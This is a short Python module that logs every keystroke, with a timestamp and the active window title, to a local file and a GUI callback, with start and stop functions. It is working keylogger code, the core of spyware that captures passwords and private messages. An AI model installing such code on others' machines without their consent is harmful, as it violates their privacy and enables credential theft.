from pynput import keyboard
from datetime import datetime
from utils import get_active_window

running = False

def format_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key.name}]"

def on_press(key, callback):
    if running:
        window = get_active_window()
        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        k = format_key(key)

        log = f"{time} | {window} | {k}\n"

        # Save to file
        with open("logs/log.txt", "a") as f:
            f.write(log)

        # Send to GUI
        callback(log)

def start_listener(callback):
    global running
    running = True
    listener = keyboard.Listener(on_press=lambda key: on_press(key, callback))
    listener.start()
    return listener

def stop_listener():
    global running
    running = False
